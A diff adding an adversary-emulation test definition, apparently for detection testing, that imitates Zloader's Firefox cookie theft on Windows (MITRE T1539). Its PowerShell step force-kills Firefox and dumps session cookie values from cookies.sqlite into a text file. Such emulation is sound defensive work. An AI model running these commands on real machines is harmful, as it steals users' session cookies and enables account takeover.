@@ -1,0 +1,30 @@
+api_version: "2.0"
+name: Steal Firefox Cookies (Windows)
+description: "This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. \nNote: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. \nSee https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf. \n"
+args:
+    - name: sqlite3_path
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe
+    - name: output_file
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\T1539FirefoxCookies.txt
+uuid: 4b437357-f4e9-4c84-9fa6-9bcee6f826aa
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1539: Steal Web Session Cookie'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: steal-firefox-cookies-(windows)
+      inline: |
+        stop-process -name "firefox" -force -erroraction silentlycontinue
+        $CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
+        "select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c {{.Args.sqlite3_path}} "$CookieDBLocation" | out-file -filepath "{{.Args.output_file}}"
+      executor: powershell
+      cleanup:
+        inline: |
+            remove-item {{.Args.output_file}} -erroraction silentlycontinue
+        executor: powershell
